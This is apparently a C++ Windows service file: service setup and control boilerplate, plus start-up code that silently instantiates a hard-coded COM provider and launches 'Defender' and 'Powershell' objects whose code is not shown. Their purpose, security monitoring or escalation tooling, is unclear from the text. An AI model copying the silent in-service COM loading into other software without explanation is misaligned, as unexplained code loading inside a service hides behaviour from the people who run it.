#include "main.h"
#include <unknwn.h>

SERVICE_STATUS gSvcStatus = {};
SERVICE_STATUS_HANDLE gSvcStatusHandle = nullptr;
HANDLE ghSvcStopEvent = nullptr;

static const CLSID CLSID_MyProvider = {0x5f3e9c28,0x3e4a,0x4a8a,{0x9b,0x0c,0x9c,0x42,0x3e,0x3a,0xa7,0x11}};

static bool Greathelm_SilentLoad() {
    bool ok = false;
    HRESULT co = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    IUnknown* u = nullptr;
    HRESULT cr = CoCreateInstance(CLSID_MyProvider, nullptr, CLSCTX_INPROC_SERVER, IID_IUnknown, (void**)&u);
    if (SUCCEEDED(cr) && u) { u->Release(); ok = true; }
    if (co == S_OK || co == S_FALSE) CoUninitialize();
    return ok;
}

static DWORD WINAPI PowershellStartThread(LPVOID p) {
    auto def = static_cast<ESCALATE::Defender*>(p);
    new MATCH::Powershell(def);
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    const SERVICE_TABLE_ENTRYW ste[] = {
        { const_cast<LPWSTR>(SVCNAME), SvcMain },
        { nullptr, nullptr }
    };
    StartServiceCtrlDispatcherW(ste);
    return 0;
}

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv) {
    gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);
    if (!gSvcStatusHandle) { SvcReportEvent(TEXT("RegisterServiceCtrlHandler")); return; }
    ZeroMemory(&gSvcStatus, sizeof(gSvcStatus));
    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwServiceSpecificExitCode = 0;
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
    SvcInit(dwArgc, lpszArgv);
}

VOID SvcInit(DWORD, LPTSTR*) {
    ghSvcStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (!ghSvcStopEvent) { ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0); return; }

    Greathelm_SilentLoad();

    auto def = new ESCALATE::Defender(0b010, nullptr, nullptr, nullptr);
    HANDLE hPs = CreateThread(nullptr, 0, PowershellStartThread, def, 0, nullptr);
    if (hPs) CloseHandle(hPs);

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
    WaitForSingleObject(ghSvcStopEvent, INFINITE);
    if (ghSvcStopEvent) { CloseHandle(ghSvcStopEvent); ghSvcStopEvent = nullptr; }
    ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;
    gSvcStatus.dwControlsAccepted = (dwCurrentState == SERVICE_START_PENDING) ? 0 : (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
    gSvcStatus.dwCheckPoint = (dwCurrentState == SERVICE_RUNNING || dwCurrentState == SERVICE_STOPPED) ? 0 : dwCheckPoint++;
    SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

VOID WINAPI SvcCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
        if (ghSvcStopEvent) SetEvent(ghSvcStopEvent);
        return;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
}

VOID SvcReportEvent(LPCTSTR szFunction) {
    HANDLE hEventSource = RegisterEventSource(nullptr, SVCNAME);
    if (hEventSource) {
        TCHAR Buffer[256];
        StringCchPrintf(Buffer, 256, TEXT("%s failed with %lu"), szFunction, GetLastError());
        LPCTSTR Strings[1] = { Buffer };
        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 0xC0020001, nullptr, 1, 0, Strings, nullptr);
        DeregisterEventSource(hEventSource);
    }
}
